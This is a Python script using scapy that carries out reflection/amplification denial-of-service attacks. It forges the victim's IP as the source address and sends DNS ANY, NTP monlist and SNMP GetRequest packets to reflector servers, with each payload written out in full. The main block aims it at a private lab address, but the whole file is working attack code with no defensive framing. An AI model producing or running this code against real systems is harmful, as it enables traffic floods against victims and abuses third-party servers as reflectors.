import scapy.all as scapy
import random

def amp_attack(reflector, victim=None, service="DNS", port=None):
    """
    Perform an amplification attack on the given reflector service.

    Parameters:
    - reflector: IP of the reflector server being exploited.
    - victim: IP of the victim; if None, response will come back to us.
    - service: The type of service exploited (default "DNS").
    - port: The port to target on the reflector (if different from default).
    """
    src_ip = victim if victim else scapy.get_if_addr(scapy.conf.iface)
    port = port or {"DNS": 53, "NTP": 123, "SNMP": 161}.get(service)

    if not port:
        raise ValueError(f"No port specified and no default known for {service}")

    match service:
        case "DNS":
            # Amplification via DNS ANY query
            pkt = scapy.IP(src=src_ip, dst=reflector)/ \
                  scapy.UDP(sport=random.randint(1024,65535), dport=port)/ \
                  scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com", qtype=255))
        


        case "NTP":
            # NTP monlist request (legacy, still used in some old servers)
            # payload: 0x17 0x00 0x03 0x2a + 4 null bytes
            pkt = scapy.IP(src=src_ip, dst=reflector)/ \
                  scapy.UDP(sport=random.randint(1024,65535), dport=port)/ \
                  scapy.Raw(load=b'\x17\x00\x03\x2a' + b'\x00' * 4)

        case "SNMP":
            # SNMP v1 GetRequest for sysDescr.0 (1.3.6.1.2.1.1.1.0)
            pkt = scapy.IP(src=src_ip, dst=reflector)/ \
                  scapy.UDP(sport=random.randint(1024,65535), dport=port)/ \
                  scapy.Raw(load=bytes.fromhex(
                      "302602010104067075626c6963a019020470b5504b020100020100300b300906052b060102010500"
                  ))

        case _:
            raise ValueError(f"Unsupported service: {service}")

    scapy.send(pkt, verbose=1)
    print(f"Sent {service} amplification request to {reflector} (spoofed source: {src_ip})")

if __name__ == "__main__":
    amp_attack("192.168.56.4", service="DNS")

